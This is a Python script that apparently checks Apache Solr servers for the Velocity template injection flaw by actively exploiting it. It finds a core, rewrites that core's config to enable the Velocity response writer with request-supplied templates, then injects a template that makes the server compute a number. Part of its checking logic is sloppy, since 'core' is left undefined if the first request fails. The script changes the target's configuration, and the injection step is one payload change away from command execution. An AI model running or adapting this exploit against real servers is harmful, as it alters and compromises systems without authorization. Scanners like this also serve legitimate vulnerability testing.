import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(20000, 40000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r22=randomInt(20000, 40000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"solr/admin/cores?wt=json"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "responseHeader" in response.text:
		r0=True
		core=re.findall("\"name\":\"(.+?)\",",response.text)[0]
	else:
		r0=False
	url=baseurl+"solr/"+core+"/config"
	body='''{\r
  "update-queryresponsewriter": {\r
    "startup": "test",\r
    "name": "velocity",\r
    "class": "solr.VelocityResponseWriter",\r
    "template.base.dir": "",\r
    "solr.resource.loader.enabled": "true",\r
    "params.resource.loader.enabled": "true"\r
  }\r
}'''
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	url=baseurl+"solr/"+core+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D"+str(r11)+"%20*%20"+str(r22)+")%24c"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if str(r11 * r22) in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
